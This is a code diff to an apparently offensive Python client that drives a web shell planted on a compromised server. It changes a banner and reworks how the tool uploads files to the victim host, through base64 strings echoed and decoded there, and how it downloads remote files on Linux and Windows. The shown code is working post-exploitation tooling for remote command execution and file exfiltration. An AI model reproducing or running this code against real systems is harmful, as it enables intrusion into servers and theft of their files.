@@ -17,7 +17,7 @@ def send_command(command, webshell, method, param="code"):
 
 if __name__ == "__main__":
  banner = """
-  ██▓███ ▓██   ██▓  ██████  ██░ ██ ▓█████  ██▓     ██▓    
+  ██████ ▓██   ██▓  ██████  ██░ ██ ▓█████  ██▓     ██▓    
  ▓██░  ██▒▒██  ██▒▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
  ▓██░ ██▓▒ ▒██ ██░░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    
  ▒██▄█▓▒ ▒ ░ ▐██▓░  ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
@@ -83,11 +83,11 @@ try:
                    cwd = os.getcwd()
                 print (colored("Uploading file "+ cwd + "/" + localfile +" on "+ remotefile +"..\n", "yellow"))
                 f = open(localfile, "rb") ; rawfiledata = f.read() ; base64data = base64.b64encode(rawfiledata)
-                upload = send_command("echo " + str(base64data.rstrip(), "utf-8") + (' > ') + remotefiletmp, WEBSHELL, HTTP_METHOD, PARAM)
+                upload = send_command("echo " + str(base64data.rstrip(), "utf8") + (' > ') + remotefiletmp, WEBSHELL, HTTP_METHOD, PARAM)
                 if system == "linux":
                    send_command("base64 -di " + remotefiletmp + (' > ') + remotefile + " ; rm -f " + remotefiletmp, WEBSHELL, HTTP_METHOD, PARAM)
                 if system == "windows":
-                   send_command("$base64 = cat -raw " + remotefiletmp + " ; [System.Text.Encoding]::Utf8.GetString([System.Convert]::FromBase64String($base64)) > " +
+                   send_command("$base64 = cat -raw " + remotefiletmp + " ; [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64)) > " +
                    remotefile + " ; rm -force " + remotefiletmp, WEBSHELL, HTTP_METHOD, PARAM)
              else:
                 if "download" in command.split()[0]: 
@@ -98,10 +98,14 @@ try:
                    if not slash in localfile:
                       cwd = os.getcwd()
                    print (colored("Downloading file "+ remotefile +" on "+ cwd + "/" + localfile +"..\n", "yellow"))
-                   download = send_command("cat " + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
-                   f = open(localfile, "w")
-                   f.write(download)
-                   f.close()
+                   if system == "linux":
+                      base64data = send_command("base64 " + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
+                   if system == "windows":
+                   	  command = '[Convert]::ToBase64String([IO.File]::ReadAllBytes("'+remotefile+'"))'   
+                   	  base64data = send_command(command, WEBSHELL, HTTP_METHOD, PARAM)
+                   download = base64.b64decode(base64data)
+                   f = open(localfile, "wb") ; f.write(bytes(download)) ; f.close()
+
                 else:
                    if "cd" in command.split()[0]:
                       if ".." in command.split()[1]:
